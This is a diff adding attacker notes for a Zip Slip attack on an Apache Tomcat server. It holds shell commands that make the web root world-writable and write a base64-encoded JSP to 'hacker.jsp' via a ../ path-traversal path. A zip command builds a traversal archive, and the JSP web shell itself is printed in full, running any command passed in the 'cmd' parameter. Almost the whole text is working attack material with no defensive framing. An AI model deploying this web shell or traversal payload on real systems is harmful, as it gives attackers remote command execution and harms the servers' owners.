@@ -1,0 +1,55 @@
+sudo mkdir -p /usr/local/tomcat/webapps/ROOT/
+
+sudo chmod -R  777 /usr/local/tomcat/webapps/ROOT/ 
+
+echo "PCVAIHBhZ2UgbGFuZ3VhZ2U9ImphdmEiIGNvbnRlbnRUeXBlPSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiIHBhZ2VFbmNvZGluZz0iVVRGLTgiIGltcG9ydD0iamF2YS5pby4qLCBqYXZhLm5pby5jaGFyc2V0LlN0YW5kYXJkQ2hhcnNldHMiICU+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+SlNQIC0gRXhlY3V0ZSBDb21tYW5kPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxoMT5FeGVjdXRlIENvbW1hbmQ8L2gxPgogICAgCiAgICA8JQogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFN0cmluZyBjb21tYW5kID0gcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpOwogICAgICAgICAgICBpZiAoY29tbWFuZCA9PSBudWxsIHx8IGNvbW1hbmQuaXNFbXB0eSgpKSB7CiAgICAgICAgICAgICAgICBvdXQucHJpbnQoIk5vIGNvbW1hbmQgc3BlY2lmaWVkLiIpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICBQcm9jZXNzQnVpbGRlciBwcm9jZXNzQnVpbGRlciA9IG5ldyBQcm9jZXNzQnVpbGRlcihjb21tYW5kLnNwbGl0KCIgIikpOwogICAgICAgICAgICBwcm9jZXNzQnVpbGRlci5yZWRpcmVjdEVycm9yU3RyZWFtKHRydWUpOwogICAgICAgICAgICBQcm9jZXNzIHByb2Nlc3MgPSBwcm9jZXNzQnVpbGRlci5zdGFydCgpOwogICAgICAgICAgICBJbnB1dFN0cmVhbSBpbnB1dFN0cmVhbSA9IHByb2Nlc3MuZ2V0SW5wdXRTdHJlYW0oKTsKICAgICAgICAgICAgSW5wdXRTdH
+JlYW1SZWFkZXIgaW5wdXRTdHJlYW1SZWFkZXIgPSBuZXcgSW5wdXRTdHJlYW1SZWFkZXIoaW5wdXRTdHJlYW0sIFN0YW5kYXJkQ2hhcnNldHMuVVRGXzgpOwogICAgICAgICAgICBCdWZmZXJlZFJlYWRlciBidWZmZXJlZFJlYWRlciA9IG5ldyBCdWZmZXJlZFJlYWRlcihpbnB1dFN0cmVhbVJlYWRlcik7CgogICAgICAgICAgICBTdHJpbmdCdWlsZGVyIG91dHB1dCA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7CiAgICAgICAgICAgIFN0cmluZyBsaW5lOwogICAgICAgICAgICB3aGlsZSAoKGxpbmUgPSBidWZmZXJlZFJlYWRlci5yZWFkTGluZSgpKSAhPSBudWxsKSB7CiAgICAgICAgICAgICAgICBvdXRwdXQuYXBwZW5kKGxpbmUpOwogICAgICAgICAgICAgICAgb3V0cHV0LmFwcGVuZChTeXN0ZW0ubGluZVNlcGFyYXRvcigpKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgYnVmZmVyZWRSZWFkZXIuY2xvc2UoKTsKICAgICU+CiAgICAKICAgIDxwcmU+PCU9IG91dHB1dC50b1N0cmluZygpICU+PC9wcmU+CiAgICAKICAgIDwlCiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgb3V0LnByaW50KCJBbiBlcnJvciBvY2N1cnJlZDogIiArIGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICB9CiAgICAlPgo8L2JvZHk+CjwvaHRtbD4=" | base64 -d > ../../../../../../../../../../../../../../../usr/local/tomcat/webapps/ROOT/hacker.jsp
+
+Command the big:
+zip zipslip.zip ../../../../../../../../../../../../../../../usr/local/tomcat/webapps/ROOT/hacker1.jsp
+
+Payload JSP:
+
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" import="java.io.*, java.nio.charset.StandardCharsets" %>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JSP - Execute Command</title>
+</head>
+<body>
+    <h1>Execute Command</h1>
+    
+    <%
+        try {
+            String command = request.getParameter("cmd");
+            if (command == null || command.isEmpty()) {
+                out.print("No command specified.");
+                return;
+            }
+
+            ProcessBuilder processBuilder = new ProcessBuilder(command.split(" "));
+            processBuilder.redirectErrorStream(true);
+            Process process = processBuilder.start();
+            InputStream inputStream = process.getInputStream();
+            InputStreamReader inputStreamReader = new InputStreamReader(inputStream, StandardCharsets.UTF_8);
+            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
+
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = bufferedReader.readLine()) != null) {
+                output.append(line);
+                output.append(System.lineSeparator());
+            }
+
+            bufferedReader.close();
+    %>
+    
+    <pre><%= output.toString() %></pre>
+    
+    <%
+        } catch (Exception e) {
+            out.print("An error occurred: " + e.getMessage());
+        }
+    %>
+</body>
+</html>
